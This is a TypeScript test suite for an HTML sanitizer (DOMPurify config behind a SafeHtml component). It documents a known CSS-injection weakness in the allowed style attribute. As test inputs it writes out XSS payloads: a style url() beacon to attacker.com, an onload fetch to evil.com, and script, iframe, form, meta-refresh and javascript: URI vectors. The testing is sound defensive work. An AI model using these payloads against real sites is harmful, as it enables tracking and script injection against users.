/**
 * Security tests — SafeHtml XSS prevention & CSS injection
 *
 * VULN #7: SafeHtml allows `style` attribute in ALLOWED_ATTR.
 *          CSS injection via `background: url(...)` can be used for tracking/data exfil.
 *
 * Tests use DOMPurify directly with the same config as SafeHtml component.
 */

import DOMPurify from 'dompurify';

// Same config as SafeHtml.tsx
const ALLOWED_TAGS = [
  'p', 'br', 'strong', 'em', 'u', 's', 'b', 'i',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li',
  'a', 'img',
  'blockquote', 'pre', 'code',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
  'figure', 'figcaption',
  'div', 'span', 'hr',
];

const ALLOWED_ATTR = [
  'href', 'target', 'rel', 'src', 'alt', 'title', 'width', 'height',
  'class', 'id', 'style', 'colspan', 'rowspan',
];

function sanitize(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOW_DATA_ATTR: false,
  });
}

describe('SafeHtml Security — XSS & CSS Injection', () => {
  describe('VULN #7: style attribute allows CSS injection', () => {
    it('VULNERABILITY: preserves style attribute (potential CSS tracking)', () => {
      const html = '<div style="background: url(https://attacker.com/track?user=1)">Content</div>';
      const result = sanitize(html);

      // style attribute is preserved — this IS the vulnerability
      expect(result).toContain('style=');
    });

    it('VULNERABILITY: CSS expression-like values pass through', () => {
      const html = '<span style="color: red; font-size: 999px">HUGE TEXT</span>';
      const result = sanitize(html);
      expect(result).toContain('style=');
    });
  });

  describe('XSS prevention — script tags stripped', () => {
    it('should strip <script> tags', () => {
      const html = '<p>Hello</p><script>alert("XSS")</script>';
      const result = sanitize(html);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('alert');
      expect(result).toContain('<p>Hello</p>');
    });

    it('should strip script tags with attributes', () => {
      const html = '<script src="https://evil.com/xss.js"></script>';
      const result = sanitize(html);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('evil.com');
    });
  });

  describe('XSS prevention — event handlers stripped', () => {
    it('should strip onclick handler', () => {
      const html = '<div onclick="alert(1)">Click me</div>';
      const result = sanitize(html);
      expect(result).not.toContain('onclick');
      expect(result).toContain('Click me');
    });

    it('should strip onerror handler on img', () => {
      const html = '<img src="x" onerror="alert(1)">';
      const result = sanitize(html);
      expect(result).not.toContain('onerror');
    });

    it('should strip onload handler', () => {
      const html = '<img src="photo.jpg" onload="fetch(\'https://evil.com\')">';
      const result = sanitize(html);
      expect(result).not.toContain('onload');
    });

    it('should strip onmouseover handler', () => {
      const html = '<a href="#" onmouseover="alert(1)">Hover</a>';
      const result = sanitize(html);
      expect(result).not.toContain('onmouseover');
    });
  });

  describe('XSS prevention — dangerous tags stripped', () => {
    it('should strip iframe tags', () => {
      const html = '<iframe src="https://evil.com"></iframe>';
      const result = sanitize(html);
      expect(result).not.toContain('<iframe');
    });

    it('should strip object/embed tags', () => {
      const html = '<object data="malware.swf"></object><embed src="malware.swf">';
      const result = sanitize(html);
      expect(result).not.toContain('<object');
      expect(result).not.toContain('<embed');
    });

    it('should strip form tags', () => {
      const html = '<form action="https://evil.com"><input name="password"></form>';
      const result = sanitize(html);
      expect(result).not.toContain('<form');
      expect(result).not.toContain('<input');
    });

    it('should strip meta tags', () => {
      const html = '<meta http-equiv="refresh" content="0;url=https://evil.com">';
      const result = sanitize(html);
      expect(result).not.toContain('<meta');
    });
  });

  describe('Safe HTML passes through correctly', () => {
    it('should allow basic formatting tags', () => {
      const html = '<p>Hello <strong>world</strong>, <em>italic</em>, <u>underline</u></p>';
      const result = sanitize(html);
      expect(result).toContain('<p>');
      expect(result).toContain('<strong>');
      expect(result).toContain('<em>');
      expect(result).toContain('<u>');
    });

    it('should allow headings', () => {
      const html = '<h1>Title</h1><h2>Subtitle</h2>';
      const result = sanitize(html);
      expect(result).toContain('<h1>');
      expect(result).toContain('<h2>');
    });

    it('should allow links with href', () => {
      const html = '<a href="https://school.edu.vn" target="_blank">Link</a>';
      const result = sanitize(html);
      expect(result).toContain('href="https://school.edu.vn"');
    });

    it('should allow images with safe attributes', () => {
      const html = '<img src="/uploads/photo.jpg" alt="Photo" width="300" height="200">';
      const result = sanitize(html);
      expect(result).toContain('src="/uploads/photo.jpg"');
      expect(result).toContain('alt="Photo"');
    });

    it('should allow tables', () => {
      const html = '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>';
      const result = sanitize(html);
      expect(result).toContain('<table>');
      expect(result).toContain('<th>');
      expect(result).toContain('<td>');
    });

    it('should allow lists', () => {
      const html = '<ul><li>Item 1</li><li>Item 2</li></ul>';
      const result = sanitize(html);
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>');
    });

    it('should strip data-* attributes', () => {
      const html = '<div data-custom="value">Content</div>';
      const result = sanitize(html);
      expect(result).not.toContain('data-custom');
    });
  });

  describe('JavaScript URI scheme prevention', () => {
    it('should strip javascript: href', () => {
      const html = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitize(html);
      expect(result).not.toContain('javascript:');
    });

    it('should strip javascript: in img src', () => {
      const html = '<img src="javascript:alert(1)">';
      const result = sanitize(html);
      expect(result).not.toContain('javascript:');
    });
  });
});
